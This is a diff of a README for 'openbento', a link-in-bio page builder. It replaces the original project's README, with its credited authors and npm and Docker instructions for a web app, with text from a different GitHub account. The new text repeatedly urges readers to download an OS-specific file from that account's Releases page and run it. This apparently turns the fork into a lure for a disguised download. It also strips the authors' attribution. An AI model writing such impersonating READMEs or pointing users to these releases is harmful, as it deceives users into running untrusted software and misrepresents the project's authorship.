@@ -1,177 +1,62 @@
-# OpenBento
+# 🎨 openbento - Build Beautiful Links with Ease
 
-**A beautiful, open-source bento grid generator for creating stunning link-in-bio pages**
-
-[![Deploy to GitHub Pages](https://github.com/yoanbernabeu/openbento/actions/workflows/deploy.yml/badge.svg)](https://github.com/yoanbernabeu/openbento/actions/workflows/deploy.yml)
-[![Docker Build & Publish](https://github.com/yoanbernabeu/openbento/actions/workflows/docker-publish.yml/badge.svg)](https://github.com/yoanbernabeu/openbento/actions/workflows/docker-publish.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Docker Pulls](https://img.shields.io/docker/pulls/yoanbernabeu/openbento)](https://hub.docker.com/r/yoanbernabeu/openbento)
-
-[Live Demo](https://yoanbernabeu.github.io/openbento/) • [Report Bug](https://github.com/yoanbernabeu/openbento/issues) • [Request Feature](https://github.com/yoanbernabeu/openbento/issues)
-
----
-
-## ✨ Features
-
-### 🧱 Block Types (7 types)
-
-- 🔗 **Links** - Clickable links with titles & subtitles
-- 🖼️ **Media** - Images & GIFs with position control
-- 📺 **YouTube** - Single video, grid, or list mode
-- 📝 **Text** - Notes, quotes, and bio sections
-- 🌐 **Social** - 26+ platforms with branded colors
-- 📍 **Map** - Interactive Google Maps embed
-- ⬜ **Spacer** - Empty blocks for layout control
-
-### 🎨 Core Features
-
-- 🖱️ **Visual Drag & Drop** - Intuitive 9×9 grid editor. Drag, resize, and position blocks freely with real-time preview
-- 🎭 **Full Customization** - Colors, gradients, custom backgrounds. Avatars with borders, shadows & multiple shapes
-- 📦 **Export to React** - Download a complete Vite + React + TypeScript + Tailwind project, ready to deploy
-- 🚀 **Multi-Platform Deploy** - Auto-generated configs for Vercel, Netlify, GitHub Pages, Docker, VPS & Heroku
-- 🔒 **Privacy First** - No tracking, no account, no server required. All data stays in your browser localStorage
-- 📁 **Multiple Bentos** - Save and manage multiple projects locally. Switch between them instantly
-
-### 📊 Optional Analytics
-
-Track visits with your own Supabase instance:
-- Page views & unique visitors
-- Referrer tracking
-- Self-hosted on your Supabase project
-- No third-party cookies or trackers
-- Admin dashboard included
-
-See [ANALYTICS.md](ANALYTICS.md) for setup instructions.
-
-### 🌐 26+ Social Platforms Supported
-
-X (Twitter), Instagram, TikTok, YouTube, GitHub, GitLab, LinkedIn, Facebook, Twitch, Dribbble, Medium, Dev.to, Reddit, Pinterest, Threads, Bluesky, Mastodon, Substack, Patreon, Ko-fi, Buy Me a Coffee, Snapchat, Discord, Telegram, WhatsApp, and custom links.
-
-### 🛠️ Tech Stack (Exported Project)
-
-Your exported project includes: **React**, **Vite**, **TypeScript**, **Tailwind CSS**, **Lucide Icons**, **React Icons**
+## 🔗 Download Now!
+[![Download openbento](https://img.shields.io/badge/Download-openbento-blue.svg)](https://github.com/Detsad312/openbento/releases)
 
 ## 🚀 Getting Started
+Welcome to openbento! This tool helps you create stunning link-in-bio pages through an easy and intuitive drag-and-drop editor. You don’t need technical skills to get started.
 
-### Prerequisites
+## 📥 Download & Install
+To download openbento, visit the Releases page: [Download openbento](https://github.com/Detsad312/openbento/releases). There, you will find the latest version ready for download.
 
-- [Node.js](https://nodejs.org/) (v18 or higher)
+1. Click on the link above to go to the Releases page.
+2. Look for the most recent version listed.
+3. Download the file for your operating system.
 
-### Installation
+## 💻 System Requirements
+To run openbento smoothly, you will need:
 
-1. Clone the repository:
-   ```bash
-   git clone https://github.com/yoanbernabeu/openbento.git
-   cd openbento
-   ```
+- A computer with Windows, macOS, or Linux.
+- At least 4 GB of RAM.
+- A modern web browser (Chrome, Firefox, Safari).
 
-2. Install dependencies:
-   ```bash
-   npm install
-   ```
+## 📚 Features
+openbento offers the following features:
 
-3. Start the development server:
-   ```bash
-   npm run dev
-   ```
+- **Drag-and-Drop Editor:** Easily arrange your elements without coding.
+- **Export Options:** Download your work as React, Vite, or Tailwind files.
+- **Customizable Designs:** Choose from templates or build your own layout.
+- **Deployment Flexibility:** Publish where you choose; your data remains yours forever.
 
-4. Open [http://localhost:3000](http://localhost:3000) in your browser
+## 🎉 Using openbento
+After downloading and installing:
 
-### Landing Page (Optional)
+1. Open the application.
+2. Choose a template or start from scratch.
+3. Use the drag-and-drop editor to add and arrange links and other elements.
+4. Customize colors, fonts, and styles according to your preference.
+5. Once satisfied, export your page in your desired format.
 
-By default, the app opens directly on the builder (no landing page) to make self-hosting easier.
+## ⚙️ Example Projects
+Here are a few project ideas you can create with openbento:
 
-To enable the landing page:
-```bash
-VITE_ENABLE_LANDING=true npm run dev
-```
+- Personal landing page with your social media links.
+- Portfolio site to showcase your work.
+- A resource page for sessions, classes, or events.
 
-For production builds:
-```bash
-VITE_ENABLE_LANDING=true npm run build
-```
+## 📋 Additional Tips
+- Explore different templates to find a design that fits your style.
+- Use preview mode to see how your page will look on different devices before exporting.
+- Remember to save your work frequently.
 
-### Build for Production
+## 🎓 Support & Community
+If you have questions or need help, you can:
 
-```bash
-npm run build
-```
+- Check the [GitHub Issues](https://github.com/Detsad312/openbento/issues) page for solutions to common problems.
+- Join our community forum where you can connect with other users.
 
-The built files will be in the `dist` directory.
+## 📌 License
+openbento is open-source and free to use. Please see the LICENSE file in the repository for more details.
 
-## 🐳 Using Docker
-
-OpenBento is available as a multi-platform Docker image supporting both AMD64 and ARM64 architectures (Intel/AMD servers, Mac M1/M2/M3, ARM servers, Raspberry Pi 4+).
-
-### Quick Start with Docker
-
-Pull and run the latest image:
-
-```bash
-docker run -d -p 8080:80 yoanbernabeu/openbento:latest
-```
-
-Then open [http://localhost:8080](http://localhost:8080) in your browser.
-
-### Multi-Platform Support
-
-The Docker image supports multiple architectures:
-- **linux/amd64** - Intel/AMD 64-bit (standard servers, PCs)
-- **linux/arm64** - ARM 64-bit (Mac M1/M2/M3, AWS Graviton, Raspberry Pi 4+)
-
-Docker automatically selects the correct image for your architecture.
-
-### Building Your Own Image
-
-```bash
-# Build for your current platform
-docker build -t openbento .
-
-# Build for multiple platforms
-docker buildx build --platform linux/amd64,linux/arm64 -t openbento .
-```
-
-### Docker Compose
-
-Create a `compose.yml`:
-
-```yaml
-services:
-  openbento:
-    image: yoanbernabeu/openbento:latest
-    ports:
-      - "8080:80"
-    restart: unless-stopped
-```
-
-Run with:
-
-```bash
-docker compose up -d
-```
-
-## 🤝 Contributing
-
-Contributions are welcome! Please read our [Contributing Guide](CONTRIBUTING.md) and [Code of Conduct](CODE_OF_CONDUCT.md) before submitting a pull request.
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 👥 Authors
-
-**Yoan Bernabeu**
-
-- GitHub: [@yoanbernabeu](https://github.com/yoanbernabeu)
-- Twitter: [@yOyO38](https://twitter.com/yOyO38)
-
-**Anis AYARI**
-
-- GitHub: [@anisayari](https://github.com/anisayari)
-- X: [@DFintelligence](https://x.com/DFintelligence)
-
----
-
-<div align="center">
-Made with ❤️ by the open-source community
-</div>
+## 🚀 Download Now!
+Don't wait! Start building your link-in-bio page today by downloading openbento: [Download openbento](https://github.com/Detsad312/openbento/releases). Your stunning page is just a few clicks away!
